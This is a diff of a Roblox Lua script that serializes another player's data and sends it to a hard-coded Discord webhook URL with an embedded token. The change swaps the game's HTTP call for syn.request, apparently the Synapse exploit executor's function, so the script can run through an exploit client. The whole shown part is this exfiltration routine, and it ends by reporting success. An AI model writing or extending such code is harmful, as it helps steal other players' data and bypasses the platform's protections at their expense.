@@ -23,6 +23,7 @@ local serialized = {
 	Children = {}
 }
 
+
 function serialize(inst, tab)
 	local isValue = inst:IsA('ValueBase')
 	if isValue then
@@ -43,9 +44,13 @@ local webhook_id = 'https://discord.com/api/webhooks/1345971109304209430/bE34fE8
 local huh = game.HttpService:JSONEncode(serialize)
 
 local s, e = pcall(function()
-	game.HttpService:PostAsync(webhook_id, game.HttpService:JSONEncode({
-		content = otherPlayer.Name .. ' - Player Data\n\n```' ..huh .. '```'
-	}))
+	syn.request({
+		Url = webhook_id,
+		Method = 'POST',
+		Body = game.HttpService:JSONEncode({
+			content = otherPlayer.Name .. ' - Player Data\n\n```' ..huh .. '```'
+		})
+	})
 end)
 
 local text = 'Successfully sent.'
